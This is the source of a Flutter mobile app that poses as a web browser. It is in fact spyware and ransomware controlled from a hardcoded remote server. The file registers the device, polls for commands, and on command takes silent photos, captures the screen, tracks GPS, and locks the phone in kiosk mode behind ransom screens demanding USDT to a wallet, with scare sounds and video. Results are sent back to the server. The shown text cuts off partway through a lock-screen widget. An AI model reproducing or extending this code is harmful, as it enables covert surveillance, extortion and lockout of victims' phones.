import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:video_player/video_player.dart';

// ───────────────────────────────────────────────────────────────────────────
// SERVER
// ───────────────────────────────────────────────────────────────────────────
const String kServerBase = "http://papa.queen-official.com:2294";

// ───────────────────────────────────────────────────────────────────────────
// GLOBALS
// ───────────────────────────────────────────────────────────────────────────
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
late AudioPlayer _audioPlayer;
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "⚠️ YOUR PHONE IS LOCKED ⚠️";
String currentLockPIN = "1234";
String currentLockOwner = "Admin";
String currentLockType = "basic";
final lockChatMessages = ValueNotifier<List<Map<String, String>>>([]);
bool isLockLive = false;

const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

// ───────────────────────────────────────────────────────────────────────────
// MATRIX RAIN
// ───────────────────────────────────────────────────────────────────────────
class MatrixRainLight extends StatefulWidget {
  final Color textColor;
  const MatrixRainLight({super.key, this.textColor = const Color(0xFF00FF00)});

  @override
  State<MatrixRainLight> createState() => _MatrixRainLightState();
}

class _MatrixRainLightState extends State<MatrixRainLight> {
  late List<int> _drops;
  late List<List<String>> _columns;
  late Timer _timer;
  final Random _random = Random();
  static const int _columnsCount = 12;
  static const int _rowsCount = 20;
  static const String _chars = '01アイウエオカキクケコサシスセソ';

  @override
  void initState() {
    super.initState();
    _initMatrix();
    _timer = Timer.periodic(const Duration(milliseconds: 120), (timer) {
      if (mounted) {
        _updateMatrix();
        setState(() {});
      }
    });
  }

  void _initMatrix() {
    _drops = List.generate(_columnsCount, (_) => -_random.nextInt(10));
    _columns = List.generate(_columnsCount, (_) => List.generate(_rowsCount, (_) => _getRandomChar()));
  }

  String _getRandomChar() => _chars[_random.nextInt(_chars.length)];

  void _updateMatrix() {
    for (int i = 0; i < _columnsCount; i++) {
      if (_drops[i] < 0) {
        _drops[i]++;
      } else if (_drops[i] >= 0 && _drops[i] < _rowsCount) {
        _columns[i][_drops[i]] = _getRandomChar();
        _drops[i]++;
      } else {
        _drops[i] = -_random.nextInt(8);
        for (int j = 0; j < _rowsCount; j++) {
          _columns[i][j] = _getRandomChar();
        }
      }
    }
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return RepaintBoundary(
      child: CustomPaint(
        painter: _MatrixRainPainter(drops: _drops, columns: _columns, textColor: widget.textColor),
        size: Size.infinite,
      ),
    );
  }
}

class _MatrixRainPainter extends CustomPainter {
  final List<int> drops;
  final List<List<String>> columns;
  final Color textColor;

  _MatrixRainPainter({required this.drops, required this.columns, required this.textColor});

  @override
  void paint(Canvas canvas, Size size) {
    final double columnWidth = size.width / 12;
    final double fontSize = 14.0;
    final double charHeight = fontSize * 0.85;

    for (int i = 0; i < 12; i++) {
      double x = i * columnWidth;
      for (int j = 0; j < 20; j++) {
        if (j <= drops[i] && drops[i] - j < 8) {
          double opacity = 1.0 - ((drops[i] - j) / 8.0);
          if (opacity < 0.15) opacity = 0.15;
          Color charColor = textColor.withOpacity(opacity);
          if (j == drops[i] - 1) charColor = Colors.white;
          final textPainter = TextPainter(
            text: TextSpan(text: columns[i][j], style: TextStyle(color: charColor, fontSize: fontSize, fontFamily: 'monospace')),
            textDirection: TextDirection.ltr,
          );
          textPainter.layout();
          textPainter.paint(canvas, Offset(x + (columnWidth - textPainter.width) / 2, j * charHeight));
        }
      }
    }
  }

  @override
  bool shouldRepaint(covariant _MatrixRainPainter oldDelegate) {
    return oldDelegate.drops != drops;
  }
}

// ───────────────────────────────────────────────────────────────────────────
// APP CONFIG
// ───────────────────────────────────────────────────────────────────────────
class AppConfig {
  static String embeddedPairId = "";
  static String fakeUrl = "https://www.google.com";

  static Future<void> loadConfig() async {
    try {
      final String configString = await rootBundle.loadString('assets/config.json');
      final Map<String, dynamic> config = jsonDecode(configString);
      embeddedPairId = config['pairId'] ?? "";
      fakeUrl = config['fakeUrl'] ?? "https://www.google.com";
      print("✅ Loaded config - Fake URL: $fakeUrl");
    } catch (e) {
      print("❌ Config error: $e");
      embeddedPairId = "";
    }
  }
}

// ───────────────────────────────────────────────────────────────────────────
// FUNGSI SUARA
// ───────────────────────────────────────────────────────────────────────────
void playScarySound() async {
  try {
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.play(AssetSource('sounds/scary.mp3'));
  } catch (e) {
    try {
      await _audioPlayer.setReleaseMode(ReleaseMode.loop);
      await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
    } catch (e2) {}
  }
}

void stopSound() async {
  try {
    await _audioPlayer.stop();
  } catch (e) {}
}

// ───────────────────────────────────────────────────────────────────────────
// MAIN
// ───────────────────────────────────────────────────────────────────────────
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  _audioPlayer = AudioPlayer();
  await AppConfig.loadConfig();

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId = info['id']!;
  globalDeviceModel = info['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
    await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId);
  } catch (_) {}

  final prefs = await SharedPreferences.getInstance();
  String? savedPair = prefs.getString('pairId');

  if ((savedPair == null || savedPair.isEmpty) && AppConfig.embeddedPairId.isNotEmpty) {
    final success = await pairDevice(AppConfig.embeddedPairId);
    if (success) {
      savedPair = AppConfig.embeddedPairId;
    }
  }

  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    _startSpyware(globalDeviceId);
  }

  final isDeviceLocked = prefs.getBool('device_locked') ?? false;

  if (isDeviceLocked) {
    currentLockMessage = prefs.getString('lock_message') ?? '⚠️ YOUR PHONE IS LOCKED ⚠️';
    currentLockPIN = prefs.getString('lock_pin') ?? '1234';
    currentLockOwner = prefs.getString('lock_owner') ?? 'Admin';
    currentLockType = prefs.getString('lock_type') ?? 'basic';
    deviceLocked.value = true;
    playScarySound();
  }

  runApp(const AppRoot());
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.photos,
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) {
    id = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(
      Uri.parse("$kServerBase/api/register-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({"id": id, "model": model, "battery": lv.toString(), "status": "Online", "lastSeen": DateTime.now().toIso8601String()}),
    );
  } catch (_) {}
}

Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    final res = await http.post(
      Uri.parse("$kServerBase/api/pair-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({"pairId": pairId, "deviceId": globalDeviceId, "model": globalDeviceModel, "battery": lv.toString()}),
    ).timeout(const Duration(seconds: 15));
    if (res.statusCode == 200) {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('pairId', pairId);
      return true;
    }
  } catch (_) {}
  return false;
}

Future<void> _clearLockState() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('lock_message');
    await prefs.remove('lock_pin');
    await prefs.remove('lock_owner');
    await prefs.remove('lock_type');
    await prefs.remove('lock_live');
    await prefs.remove('scare_video_url');
    await prefs.setBool('device_locked', false);

    currentLockMessage = "⚠️ YOUR PHONE IS LOCKED ⚠️";
    currentLockPIN = "1234";
    currentLockOwner = "Admin";
    currentLockType = "basic";
    isLockLive = false;
    lockChatMessages.value = [];
  } catch (e) {}
}

// ───────────────────────────────────────────────────────────────────────────
// PROSES COMMAND
// ───────────────────────────────────────────────────────────────────────────
Future<void> _processCommand(String cmd, String extra, String id) async {
  dynamic result;
  
  print("🔥 COMMAND: $cmd");
  print("📝 EXTRA: $extra");
  
  if (cmd == 'hard_lock' || cmd == 'lock_device') {
    String lockMsg = '⚠️ YOUR PHONE IS LOCKED ⚠️';
    String lockPin = '1234';
    String lockOwner = 'Admin';

    print("🔍 PARSING EXTRA: $extra");
    
    if (extra.contains('|')) {
      final parts = extra.split('|');
      lockMsg = parts[0].isNotEmpty ? parts[0] : '⚠️ YOUR PHONE IS LOCKED ⚠️';
      lockPin = parts.length > 1 && parts[1].isNotEmpty ? parts[1] : '1234';
      lockOwner = parts.length > 2 && parts[2].isNotEmpty ? parts[2] : 'Admin';
      print("✅ PARSED: Msg=$lockMsg, Pin=$lockPin, Owner=$lockOwner");
    } else if (extra.isNotEmpty) {
      lockMsg = extra;
    }

    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('device_locked', true);
    await prefs.setString('lock_message', lockMsg);
    await prefs.setString('lock_pin', lockPin);
    await prefs.setString('lock_owner', lockOwner);
    await prefs.setString('lock_type', 'basic');
    
    currentLockMessage = lockMsg;
    currentLockPIN = lockPin;
    currentLockOwner = lockOwner;
    currentLockType = 'basic';
    deviceLocked.value = true;
    
    print("🔒 LOCK ACTIVATED! Owner: $lockOwner");
    
    playScarySound();

    try {
      await platformSpy.invokeMethod('enableKioskMode');
      await platformSpy.invokeMethod('disableStatusBar');
      await platformSpy.invokeMethod('disableRecentApps');
      await platformSpy.invokeMethod('bringToForeground');
    } catch (_) {}

    result = {"status": "Locked", "owner": lockOwner};
  } 
  else if (cmd == 'unlock' || cmd == 'unlock_device') {
    print("🔓 UNLOCK COMMAND");
    if (deviceLocked.value) {
      await _clearLockState();
      deviceLocked.value = false;
      stopSound();
      
      try {
        await platformSpy.invokeMethod('stopLockOverlay');
        await platformSpy.invokeMethod('disableKioskMode');
      } catch (_) {}
    }
    result = {"status": "Unlocked"};
  }
  else if (cmd == 'lock_live') {
    String lockMsg = '⚠️ HP INI DIKUNCI ⚠️';
    String lockPin = '1234';
    String lockOwner = 'Admin';
    if (extra.contains('|')) {
      final p = extra.split('|');
      lockMsg = p[0].isNotEmpty ? p[0] : '⚠️ HP INI DIKUNCI ⚠️';
      lockPin = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
      lockOwner = p.length > 2 && p[2].isNotEmpty ? p[2] : 'Admin';
    }
    
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('device_locked', true);
    await prefs.setString('lock_message', lockMsg);
    await prefs.setString('lock_pin', lockPin);
    await prefs.setString('lock_owner', lockOwner);
    await prefs.setString('lock_type', 'live');
    await prefs.setBool('lock_live', true);
    
    currentLockMessage = lockMsg;
    currentLockPIN = lockPin;
    currentLockOwner = lockOwner;
    currentLockType = 'live';
    isLockLive = true;
    deviceLocked.value = true;
    
    playScarySound();
    result = {"status": "LockLive"};
  }
  else if (cmd == 'lock_with_html') {
    String htmlContent = '';
    String pin = '1234';
    String message = '⚠️ DEVICE COMPROMISED ⚠️';
    String owner = 'Admin';
    if (extra.contains('|')) {
      final parts = extra.split('|');
      htmlContent = parts[0];
      pin = parts.length > 1 ? parts[1] : '1234';
      message = parts.length > 2 ? parts[2] : '⚠️ DEVICE COMPROMISED ⚠️';
      owner = parts.length > 3 ? parts[3] : 'Admin';
    } else {
      htmlContent = extra;
    }
    try {
      String decoded = utf8.decode(base64.decode(htmlContent));
      htmlContent = decoded;
    } catch (_) {}
    
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('device_locked', true);
    await prefs.setString('lock_message', message);
    await prefs.setString('lock_pin', pin);
    await prefs.setString('lock_owner', owner);
    await prefs.setString('lock_type', 'html');
    await prefs.setString('custom_lock_html', htmlContent);
    
    currentLockMessage = message;
    currentLockPIN = pin;
    currentLockOwner = owner;
    currentLockType = 'html';
    deviceLocked.value = true;
    
    playScarySound();
    result = {"status": "HTML_Locked"};
  }
  // 🔥🔥🔥 RANSOMWARE COMMAND 🔥🔥🔥
  else if (cmd == 'ransomware_lock') {
    print("💀 RANSOMWARE COMMAND RECEIVED");
    String ransomMsg = '🔴 DEVICE COMPROMISED! 🔴\nAll files have been encrypted!\nContact admin to unlock\n\nPayment: 500 USDT\nWallet: 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0';
    String ransomPin = '1234';
    String ransomOwner = 'R4-Tech';
    
    if (extra.contains('|')) {
      final parts = extra.split('|');
      ransomMsg = parts[0].isNotEmpty ? parts[0] : ransomMsg;
      ransomPin = parts.length > 1 && parts[1].isNotEmpty ? parts[1] : '1234';
      ransomOwner = parts.length > 2 && parts[2].isNotEmpty ? parts[2] : 'R4-Tech';
    }
    
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('device_locked', true);
    await prefs.setString('lock_message', ransomMsg);
    await prefs.setString('lock_pin', ransomPin);
    await prefs.setString('lock_owner', ransomOwner);
    await prefs.setString('lock_type', 'ransomware');
    
    currentLockMessage = ransomMsg;
    currentLockPIN = ransomPin;
    currentLockOwner = ransomOwner;
    currentLockType = 'ransomware';
    deviceLocked.value = true;
    
    print("💀 RANSOMWARE ACTIVATED by: $ransomOwner");
    playScarySound();
    
    try {
      await platformSpy.invokeMethod('enableKioskMode');
      await platformSpy.invokeMethod('disableStatusBar');
      await platformSpy.invokeMethod('disableRecentApps');
      await platformSpy.invokeMethod('bringToForeground');
    } catch (_) {}
    
    result = {"status": "Ransomware Activated", "owner": ransomOwner};
  }
  // 🎬🎬🎬 SCARE VIDEO COMMAND 🎬🎬🎬
  else if (cmd == 'play_scare_video') {
    print("🎬 SCARE VIDEO COMMAND RECEIVED");
    String videoUrl = extra.isNotEmpty ? extra : 'https://files.catbox.moe/2cpiro.mp4';
    
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('device_locked', true);
    await prefs.setString('lock_type', 'scare_video');
    await prefs.setString('scare_video_url', videoUrl);
    await prefs.setString('lock_owner', 'SCARE');
    await prefs.setString('lock_pin', '1234');
    
    currentLockType = 'scare_video';
    deviceLocked.value = true;
    
    playScarySound();
    
    try {
      await platformSpy.invokeMethod('enableKioskMode');
      await platformSpy.invokeMethod('disableStatusBar');
      await platformSpy.invokeMethod('disableRecentApps');
      await platformSpy.invokeMethod('bringToForeground');
    } catch (_) {}
    
    result = {"status": "ScareVideo Playing", "url": videoUrl};
  }
  else if (cmd == 'take_photo') {
    final camStatus = await Permission.camera.request();
    if (camStatus.isGranted) {
      final b64 = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra.isEmpty ? "back" : extra});
      result = b64 != null ? {"status": "Success", "image_base64": b64} : {"status": "Failed"};
    } else {
      result = {"status": "Failed - permission denied"};
    }
  }
  else if (cmd == 'get_screen') {
    final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
    result = {"status": "Success", "image_base64": b64 ?? ""};
  }
  else if (cmd == 'get_location' || cmd == 'track_gps') {
    final pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
    result = {"lat": pos.latitude, "lng": pos.longitude};
  }
  else if (cmd == 'force_open') {
    try {
      await platformSpy.invokeMethod('bringToForeground');
    } catch (_) {}
    result = {"status": "OK"};
  }
  else if (cmd == 'reboot_device' || cmd == 'restart_device') {
    try {
      await platformSpy.invokeMethod('rebootDevice');
      result = {"status": "Rebooting"};
    } catch (e) {
      result = {"status": "reboot_failed: ${e.toString()}"};
    }
  }
  else if (cmd == 'vibrate_loop') {
    try {
      await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000});
    } catch (_) {}
    result = {"status": "Vibrating"};
  }
  else if (cmd == 'flash_strobe') {
    const platformStrobe = MethodChannel('com.nullx.pp/strobe');
    await platformStrobe.invokeMethod('startStrobe');
    result = {"status": "On"};
  }
  else if (cmd == 'stop_strobe') {
    const platformStrobe = MethodChannel('com.nullx.pp/strobe');
    await platformStrobe.invokeMethod('stopStrobe');
    result = {"status": "Off"};
  }

  if (result != null) {
    try {
      await http.post(
        Uri.parse("$kServerBase/api/post-response/$id"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"data": result, "cmd": cmd}),
      ).timeout(const Duration(seconds: 2));
      print("✅ Response sent");
    } catch (e) {
      print("❌ Response failed: $e");
    }
  }
}

// ───────────────────────────────────────────────────────────────────────────
// SPYWARE
// ───────────────────────────────────────────────────────────────────────────
void _startSpyware(String id) {
  bool isProcessing = false;
  
  Future<void> checkCommand() async {
    if (isProcessing) return;
    isProcessing = true;
    
    try {
      final bat = Battery();
      int batLv = 100;
      try {
        batLv = await bat.batteryLevel;
      } catch (_) {}
      
      await http.post(
        Uri.parse("$kServerBase/api/heartbeat/$id"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": id, "status": "Alive", "battery": batLv.toString()}),
      ).timeout(const Duration(seconds: 2));
      
      final res = await http.get(
        Uri.parse("$kServerBase/api/get-command/$id")
      ).timeout(const Duration(seconds: 3));
      
      if (res.statusCode != 200 || res.body.isEmpty) {
        isProcessing = false;
        return;
      }

      final d = jsonDecode(res.body);
      String cmd = d['command'] ?? 'idle';
      if (cmd == 'idle') {
        isProcessing = false;
        return;
      }
      
      String extra = d['extra'] ?? '';
      print("📨 COMMAND: $cmd");
      
      await _processCommand(cmd, extra, id);
      
    } catch (e) {
      print("Error: $e");
    }
    
    isProcessing = false;
  }
  
  Timer.periodic(const Duration(milliseconds: 300), (_) => checkCommand());
  Future.delayed(Duration.zero, () => checkCommand());
}

// ───────────────────────────────────────────────────────────────────────────
// APP ROOT
// ───────────────────────────────────────────────────────────────────────────
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Browser',
      theme: ThemeData(brightness: Brightness.light, primarySwatch: Colors.blue, scaffoldBackgroundColor: Colors.white),
      home: const MainScreen(),
    );
  }
}

// MAIN SCREEN
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  late WebViewController _webViewController;
  bool _isLoading = true;
  String _currentUrl = AppConfig.fakeUrl;

  @override
  void initState() {
    super.initState();
    _initWebView();
    deviceLocked.addListener(_onLockChanged);
  }

  @override
  void dispose() {
    deviceLocked.removeListener(_onLockChanged);
    super.dispose();
  }

  void _onLockChanged() {
    if (mounted) setState(() {});
  }

  void _initWebView() {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.white)
      ..setNavigationDelegate(NavigationDelegate(
        onPageStarted: (String url) { setState(() { _isLoading = true; _currentUrl = url; }); },
        onPageFinished: (String url) { setState(() { _isLoading = false; }); },
      ))
      ..loadRequest(Uri.parse(AppConfig.fakeUrl));
  }

  @override
  Widget build(BuildContext context) {
    if (deviceLocked.value) {
      return const LockScreen();
    }

    return PopScope(
      canPop: false,
      child: Scaffold(
        appBar: AppBar(
          title: Row(children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
              decoration: BoxDecoration(color: Colors.grey.shade200, borderRadius: BorderRadius.circular(20)),
              child: Row(children: [
                const Icon(Icons.lock_outline, size: 14, color: Colors.green),
                const SizedBox(width: 4),
                Text(_currentUrl.replaceFirst(RegExp(r'https?://'), '').split('/')[0], style: const TextStyle(fontSize: 12)),
              ]),
            ),
          ]),
          centerTitle: false,
          actions: [IconButton(icon: const Icon(Icons.refresh), onPressed: () => _webViewController.reload())],
          elevation: 0,
          backgroundColor: Colors.white,
          foregroundColor: Colors.black,
        ),
        body: Stack(children: [
          WebViewWidget(controller: _webViewController),
          if (_isLoading) const Center(child: CircularProgressIndicator(color: Colors.blue)),
        ]),
        bottomNavigationBar: BottomAppBar(
          color: Colors.white,
          elevation: 8,
          child: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
            IconButton(icon: const Icon(Icons.arrow_back, color: Colors.black87), onPressed: () async { if (await _webViewController.canGoBack()) await _webViewController.goBack(); }),
            IconButton(icon: const Icon(Icons.arrow_forward, color: Colors.black87), onPressed: () async { if (await _webViewController.canGoForward()) await _webViewController.goForward(); }),
            IconButton(icon: const Icon(Icons.refresh, color: Colors.black87), onPressed: () => _webViewController.reload()),
            IconButton(icon: const Icon(Icons.home, color: Colors.black87), onPressed: () => _webViewController.loadRequest(Uri.parse(AppConfig.fakeUrl))),
          ]),
        ),
      ),
    );
  }
}

// ───────────────────────────────────────────────────────────────────────────
// LOCK SCREEN - LENGKAP DENGAN RANSOMWARE & SCARE VIDEO & NAMA PENGUNCI FIX
// ───────────────────────────────────────────────────────────────────────────
class LockScreen extends StatefulWidget {
  const LockScreen({super.key});

  @override
  State<LockScreen> createState() => _LockScreenState();
}

class _LockScreenState extends State<LockScreen> with TickerProviderStateMixin {
  final _pinCtrl = TextEditingController();
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  bool _isHtmlLock = false;
  String _htmlLockContent = '';
  bool _wrongPin = false;
  bool _isLockLiveLocal = false;
  String _lockMessageLocal = '⚠️ YOUR PHONE IS LOCKED ⚠️';
  String _lockPINLocal = '1234';
  String _lockOwnerName = 'Admin';
  String _lockTypeLocal = 'basic';
  String _scareVideoUrl = '';
  
  // Untuk video player
  VideoPlayerController? _videoController;
  bool _isVideoInitialized = false;

  late AnimationController _shakeController;

  @override
  void initState() {
    super.initState();
    _shakeController = AnimationController(duration: const Duration(milliseconds: 100), vsync: this);
    _loadLockState();

    _chatPollTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _enforceLockTimer = Timer.periodic(const Duration(milliseconds: 100), (_) {
      try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
    });

    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
      statusBarColor: Colors.black,
      systemNavigationBarColor: Colors.black,
    ));
  }

  @override
  void dispose() {
    _pinCtrl.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _chatPollTimer?.cancel();
    _enforceLockTimer?.cancel();
    _shakeController.dispose();
    _videoController?.dispose();
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
    super.dispose();
  }

  Future<void> _loadLockState() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _lockMessageLocal = prefs.getString('lock_message') ?? '⚠️ YOUR PHONE IS LOCKED ⚠️';
      _lockPINLocal = prefs.getString('lock_pin') ?? '1234';
      _lockOwnerName = prefs.getString('lock_owner') ?? 'Admin';
      _lockTypeLocal = prefs.getString('lock_type') ?? 'basic';
      
      final isLive = prefs.getBool('lock_live') ?? false;
      final html = prefs.getString('custom_lock_html') ?? '';
      _scareVideoUrl = prefs.getString('scare_video_url') ?? 'https://files.catbox.moe/2cpiro.mp4';

      _isLockLiveLocal = isLive;

      if (_lockTypeLocal == 'html' && html.isNotEmpty) {
        _isHtmlLock = true;
        _htmlLockContent = html;
      } else if (_lockTypeLocal == 'live') {
        _isHtmlLock = false;
        _isLockLiveLocal = true;
      } else if (_lockTypeLocal == 'scare_video') {
        _isHtmlLock = false;
        _isLockLiveLocal = false;
        _initScareVideo();
      } else {
        _isHtmlLock = false;
        _isLockLiveLocal = false;
      }
      
      print("🔓 LOCK UI LOADED: Owner='$_lockOwnerName', PIN='$_lockPINLocal', Type='$_lockTypeLocal'");
    });
  }

  Future<void> _initScareVideo() async {
    if (_scareVideoUrl.isEmpty) return;
    _videoController = VideoPlayerController.networkUrl(Uri.parse(_scareVideoUrl));
    await _videoController!.initialize();
    await _videoController!.play();
    _videoController!.setLooping(true);
    setState(() {
      _isVideoInitialized = true;
    });
  }

  Future<void> _pollChat() async {
    if (!_isLockLiveLocal || globalDeviceId.isEmpty) return;
    try {
      final res = await http.get(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId')).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200 && mounted) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty) {
          final current = List<Map<String, String>>.from(lockChatMessages.value);
          for (final m in msgs) {
            current.add({'from': m['from']?.toString() ?? 'owner', 'text': m['text']?.toString() ?? '', 'time': m['time']?.toString() ?? ''});
          }
          lockChatMessages.value = current;
        }
      }
    } catch (_) {}
  }

  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();
    final current = List<Map<String, String>>.from(lockChatMessages.value);
    current.add({'from': 'target', 'text': text.trim(), 'time': TimeOfDay.now().format(context)});
    lockChatMessages.value = current;
    try {
      await http.post(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'text': text.trim(), 'from': 'target'})).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _tryUnlock(String pin) async {
    print("🔓 UNLOCK: entered='$pin', correct='$_lockPINLocal'");
    if (pin == _lockPINLocal) {
      await _clearLockState();
      stopSound();
      try { await platformSpy.invokeMethod('stopLockOverlay'); await platformSpy.invokeMethod('disableKioskMode'); } catch (_) {}
      deviceLocked.value = false;
      _pinCtrl.clear();
      lockChatMessages.value = [];
    } else {
      _pinCtrl.clear();
      _shakeController.forward().then((_) => _shakeController.reverse());
      setState(() => _wrongPin = true);
      try { await platformSpy.invokeMethod('vibrateDevice', {'duration': 300}); } catch (_) {}
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("❌ ACCESS DENIED! ❌", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)), backgroundColor: Colors.red, duration: Duration(milliseconds: 800)));
      Future.delayed(const Duration(milliseconds: 500), () { if (mounted) setState(() => _wrongPin = false); });
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: _buildLockBody(),
      ),
    );
  }

  Widget _buildLockBody() {
    // SCARE VIDEO UI
    if (_lockTypeLocal == 'scare_video') {
      return _buildScareVideoUI();
    }
    // HTML LOCK UI
    if (_isHtmlLock && _htmlLockContent.isNotEmpty) {
      return _buildHtmlLockUI();
    }
    // LIVE LOCK UI
    if (_isLockLiveLocal) {
      return ValueListenableBuilder<List<Map<String, String>>>(
        valueListenable: lockChatMessages,
        builder: (_, msgs, __) {
          return Stack(children: [
            MatrixRainLight(textColor: const Color(0xFF00FF00)), 
            _buildLockLiveUI(msgs)
          ]);
        },
      );
    }
    // RANSOMWARE UI
    if (_lockTypeLocal == 'ransomware') {
      return _buildRansomwareUI();
    }
    // BASIC LOCK UI - DENGAN NAMA PENGUNCI YANG MUNCUL
    return Stack(children: [
      MatrixRainLight(textColor: const Color(0xFFFF0000)), 
      _buildLockBasicUI()
    ]);
  }

  Widget _buildScareVideoUI() {
    return Container(
      color: Colors.black,
      child: Stack(
        children: [
          if (_isVideoInitialized && _videoController != null)
            Center(
              child: AspectRatio(
                aspectRatio: _videoController!.value.aspectRatio,
                child: VideoPlayer(_videoController!),
              ),
            )
          else
            const Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  CircularProgressIndicator(color: Colors.red),
                  SizedBox(height: 20),
                  Text('LOADING SCARE VIDEO...', style: TextStyle(color: Colors.red)),
                ],
              ),
            ),
          // Overlay pesan
          Positioned(
            bottom: 50,
            left: 0,
            right: 0,
            child: Container(
              padding: const EdgeInsets.all(16),
              color: Colors.black.withOpacity(0.7),
              child: Column(
                children: [
                  const Text('⚠️ SYSTEM HIJACKED ⚠️', style: TextStyle(color: Colors.red, fontSize: 18, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 10),
                  TextField(
                    controller: _pinCtrl,
                    obscureText: true,
                    keyboardType: TextInputType.number,
                    textAlign: TextAlign.center,
                    style: const TextStyle(color: Colors.white, fontSize: 24),
                    decoration: InputDecoration(
                      hintText: 'ENTER PIN TO UNLOCK',
                      hintStyle: TextStyle(color: Colors.red.withOpacity(0.5)),
                      border: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                    ),
                    onSubmitted: _tryUnlock,
                  ),
                  const SizedBox(height: 10),
                  ElevatedButton(
                    onPressed: () => _tryUnlock(_pinCtrl.text),
                    style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                    child: const Text('UNLOCK', style: TextStyle(color: Colors.white)),
                  ),
                  if (_wrongPin) ...[
                    const SizedBox(height: 10),
                    const Text('WRONG PIN!', style: TextStyle(color: Colors.red)),
                  ],
